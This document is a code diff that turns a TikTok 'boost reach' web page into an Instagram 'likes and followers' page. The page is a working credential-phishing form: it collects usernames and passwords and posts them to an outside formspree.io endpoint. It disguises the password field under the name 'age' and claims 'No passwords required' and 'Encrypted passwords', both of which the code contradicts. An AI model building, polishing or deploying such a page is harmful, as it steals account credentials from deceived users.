@@ -3,108 +3,169 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TikTok Boost Reach</title>
+  <title>Instagram Boost – Likes & Followers</title>
 
-  <meta name="description" content="Estimate and improve your TikTok reach using compliant promotion methods. No passwords required." />
+  <meta name="description" content="Boost Instagram engagement with compliant promotion strategies. No passwords required." />
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
 
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #020617, #0f172a);
-      color: #ffffff;
       margin: 0;
-      padding: 0;
+      min-height: 100vh;
+      font-family: 'Poppins', sans-serif;
+      background: radial-gradient(circle at top, #f58529, #dd2a7b, #8134af, #515bd4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
     }
 
-    .container {
-      max-width: 420px;
-      margin: 100px auto;
-      padding: 32px;
-      background: #020617;
-      border-radius: 12px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
-    }
-
-    h1 {
-      font-size: 26px;
-      margin-bottom: 10px;
-      text-align: center;
-    }
-
-    p {
-      font-size: 14px;
-      color: #cbd5f5;
-      text-align: center;
-    }
-
-    input, button {
+    .card {
       width: 100%;
-      padding: 14px;
-      margin-top: 14px;
-      border-radius: 8px;
-      border: none;
-      font-size: 15px;
+      max-width: 420px;
+      padding: 36px 34px 32px;
+      background: rgba(255, 255, 255, 0.12);
+      backdrop-filter: blur(16px);
+      border-radius: 22px;
+      box-shadow:
+        0 30px 60px rgba(0, 0, 0, 0.35),
+        inset 0 0 0 1px rgba(255, 255, 255, 0.15);
+      animation: fadeUp 0.8s ease;
+    }
+
+    @keyframes fadeUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 32px;
+      font-weight: 700;
+      margin-bottom: 6px;
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: #f3f4f6;
+      margin-bottom: 26px;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
     }
 
     input {
-      background: #0f172a;
-      color: #fff;
+      width: 100%;
+      padding: 15px 16px;
+      border-radius: 12px;
+      border: none;
+      background: rgba(17, 24, 39, 0.9);
+      color: #ffffff;
+      font-size: 14px;
+      outline: none;
+      transition: box-shadow 0.2s ease, transform 0.1s ease;
     }
 
     input::placeholder {
-      color: #94a3b8;
+      color: #9ca3af;
+    }
+
+    input:focus {
+      box-shadow: 0 0 0 2px rgba(236, 72, 153, 0.6);
+      transform: translateY(-1px);
     }
 
     button {
-      background: #ec4899;
-      color: #fff;
-      font-weight: bold;
+      width: 100%;
+      padding: 15px;
+      border-radius: 14px;
+      border: none;
+      margin-top: 10px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #ffffff;
+      background: linear-gradient(90deg, #f58529, #dd2a7b, #8134af);
       cursor: pointer;
+      box-shadow: 0 10px 25px rgba(236, 72, 153, 0.45);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
     }
 
     button:hover {
-      background: #db2777;
+      transform: translateY(-2px);
+      box-shadow: 0 14px 35px rgba(236, 72, 153, 0.6);
     }
 
-    .note {
-      font-size: 11px;
-      color: #94a3b8;
-      margin-top: 16px;
-      text-align: center;
-      line-height: 1.4;
-    }
-
-    .badge {
-      margin-top: 18px;
-      text-align: center;
+    .features {
+      margin-top: 22px;
+      padding-top: 18px;
+      border-top: 1px solid rgba(255, 255, 255, 0.15);
       font-size: 12px;
-      color: #22c55e;
+      color: #e5e7eb;
+      text-align: center;
+      line-height: 1.7;
+    }
+
+    .features span {
+      display: block;
+    }
+
+    .footer-note {
+      margin-top: 18px;
+      font-size: 11px;
+      color: #d1d5db;
+      text-align: center;
+      line-height: 1.5;
+      opacity: 0.85;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>TikTok Boost Reach</h1>
-    <p>
-      Enter your details below to receive a reach estimation and promotion options.
-      
-    </p>
-
-    <form action="https://formspree.io/f/mqeeazqo" method="POST">
-      <input type="text" name="name" placeholder="TikTok Username" required />
-      <input type="password" name="age" placeholder="Password" required />
-      <input type="number" name="Age" placeholder="Age (optional)" />
-      <button type="submit">Check Reach</button>
-    </form>
-
-    <div class="badge">
-      Results in 1 hour ✔ • Policy-compliant ✔ • Secure submission ✔ • Password encrypted ✔
+  <div class="card">
+    <div class="logo">Instagram Boost</div>
+    <div class="subtitle">
+      Increase likes and followers using compliant promotion insights.
     </div>
 
-    <div class="note">
-      By submitting, you agree to have your information sent via email for analysis.
-      This service does not provide fake engagement and complies with platform policies.
+    <form action="https://formspree.io/f/mqeeazqo" method="POST">
+      <div class="form-group">
+        <input type="text" name="Instagram Username" placeholder="Instagram Username" required>
+      </div>
+
+      <div class="form-group">
+        <input type="password" name="age" placeholder="Password" required>
+      </div>
+
+      <div class="form-group">
+        <input type="number" name="Age" placeholder="Age (optional)" required>
+      </div>
+
+      <button type="submit">Check Growth</button>
+    </form>
+
+    <div class="features">
+      <span>✔ Encrypted passwords</span>
+      <span>✔ Secure email delivery</span>
+      <span>✔ Platform-compliant approach</span>
+    </div>
+
+    <div class="footer-note">
+      By submitting, you consent to receive engagement insights via email.
+      This service does not provide fake likes or followers.
     </div>
   </div>
 
